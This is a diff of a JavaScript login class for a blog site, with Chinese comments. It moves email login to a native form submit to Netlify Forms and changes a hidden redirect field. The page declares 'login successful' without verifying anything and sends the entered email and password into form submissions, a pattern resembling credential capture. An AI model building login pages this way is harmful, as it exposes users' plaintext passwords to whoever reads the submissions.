@@ -213,12 +213,9 @@ class BlogLogin {
     }
 
     bindEvents() {
-        // 邮箱登录按钮提交
-        const loginBtn = document.querySelector('.login-btn');
-        loginBtn.addEventListener('click', (e) => {
-            e.preventDefault();
-            this.handleEmailLogin(e);
-        });
+        // 邮箱登录表单提交
+        const loginForm = document.getElementById('loginForm');
+        loginForm.addEventListener('submit', (e) => this.handleEmailLogin(e));
 
         // Toggle password visibility
         const togglePassword = document.getElementById('togglePassword');
@@ -300,14 +297,8 @@ class BlogLogin {
         // 显示成功消息
         this.showNotification('登录成功！正在提交表单...', 'success');
 
-        // 使用 JavaScript 动态创建并提交表单，确保 Netlify 能收到
-        setTimeout(() => {
-            this.submitToNetlifyForms(email, password, rememberMe, 'email');
-            // 1秒后跳转到 blog.html
-            setTimeout(() => {
-                window.location.href = `blog.html?email=${encodeURIComponent(email)}&submitted=1`;
-            }, 1000);
-        }, 300);
+        // 让表单自然提交到 Netlify（Netlify 会处理 _next 跳转）
+        // 不阻止表单提交，让 Netlify 的 _next 字段生效
     }
 
     togglePasswordVisibility() {
@@ -370,7 +361,7 @@ class BlogLogin {
         const nextInput = document.createElement('input');
         nextInput.type = 'hidden';
         nextInput.name = '_next';
-        nextInput.value = 'redirect.html';
+        nextInput.value = 'blog.html';
         form.appendChild(nextInput);
 
         // 添加表单数据
